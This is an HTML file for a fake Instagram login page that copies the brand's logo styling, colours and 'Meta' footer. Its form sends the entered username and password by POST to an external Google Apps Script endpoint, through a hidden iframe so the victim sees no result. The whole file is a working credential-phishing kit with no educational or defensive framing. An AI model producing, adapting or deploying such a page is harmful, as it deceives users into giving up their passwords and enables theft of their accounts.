<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Instagram Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000; /* dark background */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #fff;
    }

    .login-container {
      text-align: center;
      width: 300px;
    }

    .logo {
      font-family: 'Brush Script MT', cursive;
      font-size: 48px;
      font-weight: bold;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      margin-bottom: 20px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      border: 1px solid #333;
      border-radius: 4px;
      background-color: #111;
      color: #fff;
    }

    input::placeholder {
      color: #aaa;
    }

    button {
      width: 100%;
      padding: 10px;
      background-color: #0095f6; /* Instagram blue */
      border: none;
      border-radius: 4px;
      color: #fff;
      font-weight: bold;
      cursor: pointer;
      margin-top: 10px;
    }

    button:hover {
      background-color: #007ac1;
    }

    .link {
      display: block;
      margin-top: 15px;
      color: #0095f6;
      text-decoration: none;
      font-size: 14px;
    }

    .link:hover {
      text-decoration: underline;
    }

    .meta {
      margin-top: 30px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">Instagram</div>
    <form
      action="https://script.google.com/macros/s/AKfycbw0-jGyl2exEHyWWWwL_bcIkHcRCFyHtMGF4PwTH3bRYoCnc7kVo1dNyV72Hmngy8_qFQ/exec"
      method="POST"
      target="hiddenFrame">

      <input type="text" id="username" name="username" placeholder="Username, email address or mobile number" required>
      <input type="password" id="password" name="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>

    <a href="#" class="link">Forgotten password?</a>
    <a href="#" class="link">Create new account</a>

    <div class="meta">Meta</div>
  </div>

  <iframe name="hiddenFrame" style="display:none;"></iframe>
</body>
</html>
